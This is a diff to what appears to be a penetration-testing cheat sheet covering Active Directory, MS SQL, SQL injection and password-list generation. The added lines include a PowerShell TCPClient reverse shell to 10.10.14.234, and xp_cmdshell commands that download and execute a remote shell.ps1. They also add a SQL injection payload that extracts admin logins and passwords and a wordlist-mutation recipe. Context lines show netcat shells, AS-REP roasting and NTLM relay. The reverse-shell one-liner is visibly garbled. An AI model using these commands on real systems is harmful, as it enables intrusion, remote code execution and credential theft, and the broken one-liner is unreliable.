@@ -1,6 +1,3 @@
-cheatsheets
-==========
-
 [//]: # (# -- 5 spaces before)
 [//]: # (## -- 4 spaces before)
 [//]: # (### -- 3 spaces before)
@@ -80,6 +77,11 @@ PS> cmd /c C:\Windows\Temp\nc.exe 127.0.0.1 1337 -e powershell
 
 1. [eternallybored.org/misc/netcat/](https://eternallybored.org/misc/netcat/)
 
+System.Net.Sockets.TCPClient:
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("10.10.14.234",1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0,ytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendbac "# ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
 
 
 ### Meterpreter
@@ -308,7 +310,7 @@ root@kali:$ nullinux.py 127.0.0.1
 ```
 
 
-#### samrdump.py (Impacket)
+#### impacket-samrdump.py
 
 ```
 root@kali:$ samrdump.py 127.0.0.1
@@ -318,7 +320,7 @@ root@kali:$ samrdump.py 127.0.0.1
 
 ### AS_REP Roasting
 
-GetNPUsers.py (Impacket):
+`impacket-GetNPUsers.py`:
 
 ```
 root@kali:$ GetNPUsers.py EXAMPLE.LOCAL/ -dc-ip 127.0.0.1 -k -no-pass -usersfile users.txt -request -format john -outputfile asrep.hash
@@ -356,7 +358,7 @@ PS> Add-ObjectAcl -TargetDistinguishedName 'DC=example,DC=local' -PrincipalName 
 ```
 
 
-#### Powerview (v2)
+#### Powerview (v3)
 
 ```
 PS> $pass = 'qwe123' |ConvertTo-SecureString -AsPlainText -Force
@@ -365,7 +367,7 @@ PS> Add-DomainObjectAcl -TargetIdentity 'DC=example,DC=local' -PrincipalIdentity
 ```
 
 
-#### ntlmrelayx.py + secretsdump.py (Impacket)
+#### impacket-ntlmrelayx.py + impacket-secretsdump.py
 
 ```
 root@kali:$ ntlmrelayx.py -t ldap://127.0.0.1 --escalate-user snovvcrash
@@ -453,8 +455,10 @@ PS> (sc.exe \\<HOSTNAME> stop dns) -and (sc.exe \\<HOSTNAME> start dns)
 
 ### Azure Admins
 
+```
 PS> . ./Azure-ADConnect.ps1
 PS> Azure-ADConnect -server 127.0.0.1 -db ADSync
+```
 
 * [github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1](https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1)
 * [blog.xpnsec.com/azuread-connect-for-redteam/](https://blog.xpnsec.com/azuread-connect-for-redteam/)
@@ -734,6 +738,45 @@ root@kali:$ mysql -u snovvcrash -p'qwe123' -e 'show databases;'
 
 
 
+### MS SQL
+
+
+#### Enable xp_cmdshell
+
+```
+1> EXEC sp_configure 'show advanced options', 1;
+2> GO
+1> RECONFIGURE;
+2> GO
+1> EXEC sp_configure 'xp_cmdshell', 1;
+2> GO
+1> RECONFIGURE;
+2> GO
+1> EXEC sp_configure 'xp_cmdshell', 1;
+2> GO
+1> xp_cmdshell 'whoami'
+2> GO
+```
+
+
+#### sqsh
+
+```
+root@kali:$ sqsh -S 127.0.0.1 -U 'EXAMPLE\snovvcrash' -P 'qwe123'
+1> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.234/shell.ps1')"
+2> GO
+```
+
+
+#### impacket-mssqlclient.py
+
+```
+root@kali:$ mssqlclient.py EXAMPLE/snovvcrash:'qwe123'@127.0.0.1 [-windows-auth]
+SQL> xp_cmdshell "powershell -nop -exec bypass IEX(New-Object Net.WebClient).DownloadString(\"http://10.10.14.234/shell.ps1\")"
+```
+
+
+
 ### SQLite
 
 ```
@@ -825,7 +868,7 @@ root@kali:$ sqlmap -r request.req --batch --file-write=./backdoor.php --file-des
 MySQL:
 
 ```
-id=1' UNION SELECT 1,(select (@a) from (select (@a:=0x00),(select (@a) from (information_schema.columns) where (@a) in (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
+id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (information_schema.columns) WHERE (@a) IN (@a:=concat(@a,'<font color=red>',table_schema,'</font>',' ::: ','<font color=green>',table_name,'</font>','<br>'))))a);-- -
 
 SELECT (@a) FROM (
 	SELECT(@a:=0x00), (
@@ -833,6 +876,10 @@ SELECT (@a) FROM (
 		WHERE (@a) IN (@a:=concat(@a,schema_name,'\n'))
 	)
 ) foo
+```
+
+```
+id=1' UNION SELECT 1,(SELECT (@a) FROM (SELECT (@a:=0x00),(SELECT (@a) FROM (mytable.users) WHERE (@a) IN (@a:=concat(@a,':::',id,':::',login,':::',password)) AND is_admin='1'))a);-- -
 ```
 
 * [defcon.ru/web-security/2320/](https://defcon.ru/web-security/2320/)
@@ -1557,11 +1604,11 @@ root@kali:$ nmaptocsv.py --help
 `parsenmap.py`:
 
 ```
-root@kali:$ git clone https://github.com/snovvcrash/Engagement /opt/Engagement
+root@kali:$ wget https://github.com/snovvcrash/cheatsheets/raw/master/scripts/parsenmap.py -O /opt/Scripts/parsenmap.py && chmod +x /opt/Scripts/parsenmap.py
 root@kali:$ ln -s /opt/Engagement/parsenmap.py /usr/local/bin/parsenmap.py
 ```
 
-* [github.com/snovvcrash/Engagement/blob/master/parsenmap.py](https://github.com/snovvcrash/Engagement/blob/master/parsenmap.py)
+* [github.com/snovvcrash/cheatsheets/blob/master/scripts/parsenmap.py](https://github.com/snovvcrash/cheatsheets/blob/master/scripts/parsenmap.py)
 
 
 
@@ -1665,6 +1712,80 @@ Flag `-A`:
 
 ```
 nmap -A ... == nmap -sC -sV -O --traceroute ...
+```
+
+
+
+
+## Generate Password List
+
+Potentially valid users if got any, `John Doe` as an example:
+
+```
+root@kali:$ cat << EOF >> passwords.txt
+johndoe
+jdoe
+j.doe
+doe
+EOF
+```
+
+Common usernames:
+
+```
+root@kali:$ cat << EOF >> passwords.txt
+admin
+administrator
+root
+guest
+sa
+changeme
+password
+EOF
+```
+
+Common patterns:
+
+```
+root@kali:$ cat << EOF >> passwords.txt
+January
+February
+March
+April
+May
+June
+July
+August
+September
+October
+November
+December
+Autumn
+Fall
+Spring
+Winter
+Summer
+password
+Password
+P@ssw0rd
+secret
+Secret
+S3cret
+EOF
+```
+
+Add year and exclamation point to the end of each password:
+
+```
+root@kali:$ for i in $(cat passwords.txt); do echo "${i}"; echo "${i}\!"; echo "${i}2020"; echo "${i}2020\!"; done > t
+root@kali:$ cp t passwords.txt
+```
+
+Mutate the wordlist with hashcat rules:
+
+```
+root@kali:$ hashcat --force --stdout passwords.txt -r /usr/share/hashcat/rules/best64.rule -r /usr/share/hashcat/rules/toggles1.rule |sort -u |awk 'length($0) > 7' > t
+root@kali:$ cp t passwords.txt
 ```
 
 
